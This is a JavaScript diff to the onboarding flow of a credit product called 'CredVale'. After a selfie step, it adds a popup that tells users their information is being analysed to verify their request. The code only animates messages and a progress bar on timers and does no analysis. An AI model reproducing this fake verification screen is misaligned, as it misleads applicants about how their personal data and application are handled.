@@ -637,8 +637,8 @@
     addMsg('Agora uma <strong>selfie</strong> 😊<br><br>• Olhe para a câmera<br>• Sem óculos escuros ou boné<br>• Boa iluminação');
 
     showMediaBtns('🤳 Tirar selfie','📁 Enviar foto',
-      function(f){ etapaConfirmarFoto(f, 'selfie', function(){ etapaAnalisePopup(); }); },
-      function(f){ etapaConfirmarFoto(f, 'selfie', function(){ etapaAnalisePopup(); }); }
+      function(f){ etapaConfirmarFoto(f, 'selfie', function(){ etapaIntroAnalise(); }); },
+      function(f){ etapaConfirmarFoto(f, 'selfie', function(){ etapaIntroAnalise(); }); }
     );
   }
 
@@ -751,6 +751,49 @@
         trackStage('Preenchendo Cadastro'); etapaDocs();
       }}
     ]);
+  }
+
+  /* ---- POPUP DE INTRODUÇÃO DA ANÁLISE ---- */
+  async function etapaIntroAnalise() {
+    var frases = [
+      'Estamos iniciando a análise das informações para verificar sua solicitação do CredVale.',
+      'Esse processo é rápido e leva apenas alguns segundos.',
+      '⏳ Importante: mantenha esta página aberta e não atualize o navegador enquanto concluímos a verificação.',
+      'Em instantes você verá o resultado da análise.'
+    ];
+    var html =
+      '<div style="text-align:center;padding:8px 0 4px;">'+
+        '<div style="width:52px;height:52px;border-radius:50%;background:rgba(59,130,246,0.1);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;border:2px solid rgba(59,130,246,0.15);">'+
+          '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3B82F6" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>'+
+        '</div>'+
+        '<div id="introFrase" style="font-size:0.82rem;color:#c8d0dc;line-height:1.6;min-height:3.4em;display:flex;align-items:center;justify-content:center;transition:opacity 0.35s;margin-bottom:16px;">'+frases[0]+'</div>'+
+        '<div style="background:rgba(255,255,255,0.04);border-radius:20px;height:5px;overflow:hidden;margin:0 4px 8px;">'+
+          '<div id="introBar" style="width:0%;height:100%;border-radius:20px;background:linear-gradient(90deg,#3B82F6,#4CC8A4);transition:width 0.3s linear;"></div>'+
+        '</div>'+
+        '<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-top:2px;">'+
+          '<div style="width:5px;height:5px;border-radius:50%;background:#3B82F6;animation:pulse-scale 0.8s ease-in-out infinite;"></div>'+
+          '<span style="font-size:0.6rem;color:#6b7a8f;">Analisando</span>'+
+        '</div>'+
+      '</div>';
+    showPopup(html);
+    var fraseEl = document.getElementById('introFrase');
+    var barEl = document.getElementById('introBar');
+    var total = 10000;
+    var interval = total / frases.length;
+    for (var i = 0; i < frases.length; i++) {
+      if (fraseEl) {
+        fraseEl.style.opacity = '0';
+        await sleep(150);
+        fraseEl.textContent = frases[i];
+        fraseEl.style.opacity = '1';
+      }
+      if (barEl) barEl.style.width = Math.round(((i+1)/frases.length)*100)+'%';
+      if (i < frases.length - 1) await sleep(interval - 150);
+    }
+    await sleep(800);
+    closePopup();
+    await sleep(300);
+    etapaAnalisePopup();
   }
 
   /* ---- ANÁLISE AUTOMÁTICA + POPUP APROVAÇÃO ---- */
